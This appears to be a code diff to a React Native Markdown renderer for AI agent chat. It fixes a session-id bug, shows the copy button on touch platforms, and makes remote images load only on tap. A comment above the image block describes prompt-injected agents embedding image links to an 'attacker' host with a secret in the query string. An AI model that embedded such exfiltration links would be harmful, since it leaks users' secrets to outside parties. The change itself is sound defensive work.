@@ -14,11 +14,17 @@ import { useRouter } from 'expo-router';
 import { copyToClipboard } from '@/utils/clipboard';
 import { MermaidRenderer } from './MermaidRenderer';
 import { t } from '@/text';
-import { isHttpMarkdownLink } from './linkUtils';
+import { isHttpMarkdownLink, markdownImageHost } from './linkUtils';
 import { openExternalUrl } from '@/utils/openExternalUrl';
 import { useDoubleTap } from '@/hooks/useDoubleTap';
 import { useChatFontScale } from '@/hooks/useChatFontScale';
 import { alertError, guarded } from '@/utils/guardAsync';
+import { isTouchWeb } from '@/utils/isTouchWeb';
+
+// Hover exists only on desktop web. Everywhere else (native, touch web) the
+// code block's Copy sat at opacity 0 with pointerEvents none forever, since
+// onMouseEnter is the only thing that ever showed it (#258).
+const HOVER_REVEALS_COPY = Platform.OS === 'web' && !isTouchWeb;
 
 // Option type for callback
 export type Option = {
@@ -60,7 +66,10 @@ export const MarkdownView = React.memo((props: {
             console.error('Error storing text for selection:', error);
             Modal.alert('Error', 'Failed to open text selection. Please try again.');
         }
-    }, [props.markdown, router]);
+        // sessionId is part of the destination: a MarkdownView reused across
+        // sessions kept pushing the PREVIOUS session's id, so Reuse landed in
+        // the wrong composer (#255).
+    }, [props.markdown, props.sessionId, router]);
     // Desktop/web: right-click opens the same text view long-press does on
     // touch (Copy the original markdown, Reuse into the composer). A right-click
     // on an active SELECTION is left to the browser — its own menu is what you
@@ -255,7 +264,7 @@ function RenderCodeBlock(props: { content: string, language: string | null, firs
                 />
             </HorizontalScrollView>
             <View
-                style={[style.copyButtonWrapper, isHovered && style.copyButtonWrapperVisible]}
+                style={[style.copyButtonWrapper, (isHovered || !HOVER_REVEALS_COPY) && style.copyButtonWrapperVisible]}
                 {...(Platform.OS === 'web' ? ({ className: 'copy-button-wrapper' } as any) : {})}
             >
                 <Pressable
@@ -269,17 +278,46 @@ function RenderCodeBlock(props: { content: string, language: string | null, firs
     );
 }
 
+// Remote images are fetched only on tap. An agent reply — or a page it was
+// prompt-injected by — can embed `![x](https://attacker/p?<secret>)`, and an
+// auto-loading <Image> made every viewer's device hit that URL on each render
+// (#94); links already open only on tap and only for http(s), images now
+// follow the same rule. Non-http(s) sources (file:, data:) never load.
 function RenderImageBlock(props: { url: string, alt: string, first: boolean, last: boolean }) {
     const accessibleLabel = props.alt || 'Markdown image';
+    const host = markdownImageHost(props.url);
+    const [loaded, setLoaded] = React.useState(false);
+    // A new URL is a new decision.
+    React.useEffect(() => { setLoaded(false); }, [props.url]);
+
+    if (!host) {
+        // Not loadable: keep the alt text so the reader knows an image was here.
+        return props.alt ? (
+            <View style={[style.imageBlock, props.first && style.first, props.last && style.last]}>
+                <Text style={style.imageCaption}>{props.alt}</Text>
+            </View>
+        ) : null;
+    }
 
     return (
         <View style={[style.imageBlock, props.first && style.first, props.last && style.last]}>
-            <Image
-                source={{ uri: props.url }}
-                style={style.image}
-                accessibilityLabel={accessibleLabel}
-                resizeMode="contain"
-            />
+            {loaded ? (
+                <Image
+                    source={{ uri: props.url }}
+                    style={style.image}
+                    accessibilityLabel={accessibleLabel}
+                    resizeMode="contain"
+                />
+            ) : (
+                <Pressable
+                    style={[style.image, style.imagePlaceholder]}
+                    onPress={() => setLoaded(true)}
+                    accessibilityRole="button"
+                    accessibilityLabel={t('markdown.loadImage', { host })}
+                >
+                    <Text style={style.imagePlaceholderText}>{t('markdown.loadImage', { host })}</Text>
+                </Pressable>
+            )}
             {props.alt ? (
                 <Text style={style.imageCaption}>{props.alt}</Text>
             ) : null}
@@ -646,6 +684,18 @@ const style = StyleSheet.create((theme) => ({
         fontSize: 14,
         lineHeight: 20,
         color: theme.colors.textSecondary,
+    },
+    imagePlaceholder: {
+        alignItems: 'center',
+        justifyContent: 'center',
+        padding: 16,
+    },
+    imagePlaceholderText: {
+        ...Typography.default('semiBold'),
+        fontSize: 14,
+        lineHeight: 20,
+        color: theme.colors.textSecondary,
+        textAlign: 'center',
     },
     copyButtonContainer: {
         position: 'absolute',
